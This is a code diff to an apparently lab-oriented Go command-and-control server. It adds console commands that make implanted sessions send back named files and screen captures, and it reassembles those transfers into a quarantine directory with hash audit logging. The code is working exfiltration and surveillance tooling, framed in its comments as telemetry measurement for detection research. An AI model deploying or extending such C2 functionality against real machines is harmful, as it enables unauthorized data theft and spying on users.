@@ -53,7 +53,9 @@ package main
 
 import (
 	"bufio"
+	"crypto/sha256"
 	"encoding/base64"
+	"encoding/hex"
 	"encoding/json"
 	"flag"
 	"fmt"
@@ -61,6 +63,7 @@ import (
 	"net"
 	"os"
 	"os/signal"
+	"path/filepath"
 	"strconv"
 	"strings"
 	"sync"
@@ -104,6 +107,8 @@ const helpText = `
   list                 show active sessions
   exec <id|all> <cmd>  run a command in one or all sessions
   ping <id|all>        measure round trip latency
+  dl <id> <path>       ask a session to transfer a file
+  shot <id>            ask a session to capture the screen
   kill <id|all>        send EXIT (controlled session termination)
   stats                counters and audit log path
   help                 this text
@@ -226,6 +231,17 @@ type Session struct {
 	// The two keystreams, present only for an encrypted-channel session.
 	ksOut *Keystream
 	ksIn  *Keystream
+
+	// The file transfers in progress, keyed by command id.
+	transferMu sync.Mutex
+	transfers  map[string]*transfer
+}
+
+// transfer is one file being received.
+type transfer struct {
+	data    []byte
+	chunks  int
+	lastSeq string
 }
 
 // storedResult is the decoded outcome of one EXEC, kept so that the console
@@ -255,6 +271,7 @@ func newSession(id int, conn net.Conn, addr string) *Session {
 		alive:     true,
 		pending:   map[string]*pendingCmd{},
 		results:   map[string]storedResult{},
+		transfers: map[string]*transfer{},
 	}
 }
 
@@ -321,6 +338,10 @@ type Server struct {
 	// The shared channel key, for the encrypted-channel variant.
 	// Empty means the compiled-in default is used.
 	channelKey []byte
+
+	// Where received file transfers are written, so the operator can look
+	// at what actually left the machine.
+	quarantineDir string
 
 	running bool
 	runMu   sync.Mutex
@@ -671,6 +692,89 @@ func (s *Server) handleLine(sess *Session, line string) {
 		fmt.Printf("[*] session %d capabilities: %s\n", sess.id, sess.capSummary)
 		return
 
+	case "CHUNK":
+		// A piece of a file transfer.
+		//
+		// The payload sends the file in base64 chunks and a DONE marker
+		// at the end. The chunks are reassembled here, and the file is
+		// written to the quarantine directory so that the operator can
+		// look at what actually left the machine.
+		//
+		// The hash the audit log records is the SERVER'S hash of what
+		// arrived, not one the payload computed. A hash the payload
+		// chose is a hash of something the payload wanted to claim.
+		if len(parts) < 5 {
+			s.audit.write("transfer_error", map[string]any{
+				"session": sess.id, "reason": "malformed CHUNK",
+			})
+			return
+		}
+		cmdID := parts[1]
+		seq := parts[2]
+		raw, err := base64.StdEncoding.DecodeString(parts[4])
+		if err != nil {
+			s.audit.write("transfer_error", map[string]any{
+				"session": sess.id, "cmd_id": cmdID,
+				"reason": "chunk is not valid base64",
+			})
+			return
+		}
+		{
+			sess.transferMu.Lock()
+			t := sess.transfers[cmdID]
+			if t == nil {
+				t = &transfer{}
+				sess.transfers[cmdID] = t
+			}
+			t.data = append(t.data, raw...)
+			t.chunks++
+			t.lastSeq = seq
+			sess.transferMu.Unlock()
+		}
+		return
+
+	case "DONE":
+		// The end of a file transfer.
+		if len(parts) < 3 {
+			s.audit.write("transfer_error", map[string]any{
+				"session": sess.id, "reason": "malformed DONE",
+			})
+			return
+		}
+		cmdID := parts[1]
+		sess.transferMu.Lock()
+		t := sess.transfers[cmdID]
+		delete(sess.transfers, cmdID)
+		sess.transferMu.Unlock()
+		if t == nil {
+			s.audit.write("transfer_error", map[string]any{
+				"session": sess.id, "cmd_id": cmdID,
+				"reason": "DONE with no chunks",
+			})
+			return
+		}
+
+		// Write it out, so the operator can look at it.
+		sum := sha256.Sum256(t.data)
+		digest := hex.EncodeToString(sum[:])
+		path := ""
+		if s.quarantineDir != "" {
+			name := fmt.Sprintf("transfer_%s_%s.bin", cmdID, digest[:16])
+			path = filepath.Join(s.quarantineDir, name)
+			if err := os.WriteFile(path, t.data, 0o600); err != nil {
+				path = ""
+			}
+		}
+
+		s.audit.write("file_transfer", map[string]any{
+			"session": sess.id, "cmd_id": cmdID,
+			"bytes": len(t.data), "chunks": t.chunks,
+			"sha256": digest, "written": path,
+		})
+		fmt.Printf("[*] session %d transferred %d bytes (sha256 %s)\n",
+			sess.id, len(t.data), digest[:16])
+		return
+
 	case "HELLO":
 		if len(parts) > 1 {
 			sess.arch = parts[1]
@@ -998,6 +1102,61 @@ func (s *Server) consoleCmd(line string) {
 				fmt.Println("       (no output)")
 			}
 		}
+	case strings.HasPrefix(line, "dl "):
+		// Ask a session to transfer a file.
+		//
+		// The path is named explicitly. There is no globbing and no
+		// directory sweep: the capability exists to be MEASURED, and the
+		// measurement is about the telemetry, not about the harvest.
+		rest := strings.TrimSpace(line[3:])
+		parts := strings.SplitN(rest, " ", 2)
+		if len(parts) < 2 {
+			fmt.Println("  usage: dl <session> <path>")
+			return
+		}
+		for _, sess := range s.targets(parts[0]) {
+			s.sessionsMu.Lock()
+			s.cmdCounter++
+			cmdID := strconv.Itoa(s.cmdCounter)
+			s.sessionsMu.Unlock()
+
+			sess.mu.Lock()
+			sess.pending[cmdID] = &pendingCmd{kind: "download",
+				t0: time.Now(), done: make(chan struct{})}
+			sess.mu.Unlock()
+
+			s.audit.write("download_requested", map[string]any{
+				"session": sess.id, "cmd_id": cmdID, "path": parts[1],
+			})
+			fmt.Printf("  -> session %d: download %s\n", sess.id, parts[1])
+			if !sess.send("DL|" + cmdID + "|" + parts[1]) {
+				fmt.Printf("  <- session %d: send failed\n", sess.id)
+			}
+		}
+
+	case strings.HasPrefix(line, "shot "):
+		// Ask a session to capture the screen.
+		rest := strings.TrimSpace(line[5:])
+		for _, sess := range s.targets(rest) {
+			s.sessionsMu.Lock()
+			s.cmdCounter++
+			cmdID := strconv.Itoa(s.cmdCounter)
+			s.sessionsMu.Unlock()
+
+			sess.mu.Lock()
+			sess.pending[cmdID] = &pendingCmd{kind: "screenshot",
+				t0: time.Now(), done: make(chan struct{})}
+			sess.mu.Unlock()
+
+			s.audit.write("screenshot_requested", map[string]any{
+				"session": sess.id, "cmd_id": cmdID,
+			})
+			fmt.Printf("  -> session %d: screen capture\n", sess.id)
+			if !sess.send("SHOT|" + cmdID) {
+				fmt.Printf("  <- session %d: send failed\n", sess.id)
+			}
+		}
+
 	case strings.HasPrefix(line, "kill"):
 		arg := argOf(line, "all")
 		for _, sess := range s.targets(arg) {
@@ -1089,6 +1248,7 @@ func main() {
 	noConsole := flag.Bool("no-console", false, "run headless (for scripted / automated runs)")
 	duration := flag.Int("duration", 0, "stop automatically after N seconds (0 = run forever)")
 	key := flag.String("key", "", "shared channel key for the encrypted-channel variant (default: the built-in lab key)")
+	quarantine := flag.String("quarantine", "", "directory to write received file transfers into")
 	flag.Parse()
 
 	fmt.Print(banner)
@@ -1097,6 +1257,14 @@ func main() {
 	if *key != "" {
 		srv.channelKey = []byte(*key)
 		fmt.Printf("[+] channel key set (encrypted-channel variant enabled)\n")
+	}
+	if *quarantine != "" {
+		if err := os.MkdirAll(*quarantine, 0o700); err == nil {
+			srv.quarantineDir = *quarantine
+			fmt.Printf("[+] quarantine: %s\n", *quarantine)
+		} else {
+			fmt.Printf("[!] quarantine directory unusable: %v\n", err)
+		}
 	}
 
 	// Ctrl+C shuts the server down cleanly so the audit log is flushed and
